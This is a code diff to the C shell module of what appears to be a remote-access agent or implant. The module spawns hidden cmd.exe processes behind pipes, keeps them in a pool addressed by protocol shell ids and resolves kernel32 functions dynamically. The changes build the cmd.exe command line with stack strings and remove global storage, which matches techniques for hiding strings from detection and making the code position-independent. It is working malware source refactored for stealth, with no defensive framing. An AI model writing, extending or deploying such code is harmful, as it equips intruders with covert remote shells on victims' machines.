@@ -5,9 +5,11 @@
 #include "shell.h"
 #include "kernel32.h"
 #include "memory.h"
+#include "stackstrings.h"
 
-/* static storage = zero-initialized: all slots start free. */
-static shell_slot shells[SHELL_POOL_SIZE];
+/* The pool is owned by agent_main() - its frame lives as long as the
+ * process - and arrives here as a parameter. Slots start zeroed (the
+ * owner clears the array); in_use == 0 is what "free" means. */
 
 /* ---------------------------------------------------------------------------
  * shell_spawn - create cmd.exe behind two pipes and record it in *slot.
@@ -52,7 +54,10 @@ int shell_spawn(shell_slot *slot)
      * after the chcp command completes. The command line MUST be a
      * writable buffer: CreateProcessW is documented to modify it in place,
      * so a string literal (read-only .rdata) crashes inside the call. */
-    WCHAR cmdline[] = L"cmd.exe /K chcp 65001 >nul";
+    /* Built on the stack (stackstrings.h); it MUST stay a writable frame
+     * buffer - CreateProcessW modifies the command line in place. */
+    WCHAR cmdline[27];
+    StrCmdline(cmdline);
     BOOL ok = kernel.CreateProcessW(NULL, cmdline,
                              NULL, NULL, TRUE, CREATE_NO_WINDOW,
                              NULL, NULL, &si, &pi);
@@ -78,11 +83,11 @@ int shell_spawn(shell_slot *slot)
 
 /* Find a free pool slot, spawn cmd.exe into it, return its index
  * (the protocol shell id). -1 = pool full or spawn failed. */
-int shell_open(void)
+int shell_open(shell_slot pool[])
 {
     for (int i = 0; i < SHELL_POOL_SIZE; i++) {
-        if (!shells[i].in_use) {
-            if (shell_spawn(&shells[i]) == 0)
+        if (!pool[i].in_use) {
+            if (shell_spawn(&pool[i]) == 0)
                 return i;
             return -1;          /* spawn failed; the slot stayed free */
         }
@@ -109,11 +114,11 @@ void shell_teardown(shell_slot *slot)
 }
 
 /* Map a protocol shell id to its slot, or NULL when never opened/closed. */
-shell_slot *shell_lookup(unsigned long long id)
+shell_slot *shell_lookup(shell_slot pool[], unsigned long long id)
 {
-    if (id >= SHELL_POOL_SIZE || !shells[id].in_use)
+    if (id >= SHELL_POOL_SIZE || !pool[id].in_use)
         return NULL;
-    return &shells[id];
+    return &pool[id];
 }
 
 /* ---------------------------------------------------------------------------
@@ -139,8 +144,7 @@ int shell_write(shell_slot *slot, const void *data, DWORD len)
  * shell_read - drain up to cap bytes of buffered output, never blocking
  * (see shell.h).
  * ------------------------------------------------------------------------- */
-int shell_read(shell_slot *slot, unsigned char *out, DWORD cap,
-               DWORD *out_len)
+int shell_read(shell_slot *slot, unsigned char *out, DWORD cap, DWORD *out_len)
 {
     KERNEL32 kernel;
     if (!KERNEL32_Ctor(&kernel))
@@ -168,8 +172,8 @@ int shell_read(shell_slot *slot, unsigned char *out, DWORD cap,
 }
 
 /* Tear down every live shell (agent shutdown - no orphaned cmd.exe). */
-void shell_teardown_all(void)
+void shell_teardown_all(shell_slot pool[])
 {
     for (int i = 0; i < SHELL_POOL_SIZE; i++)
-        shell_teardown(&shells[i]);
+        shell_teardown(&pool[i]);
 }
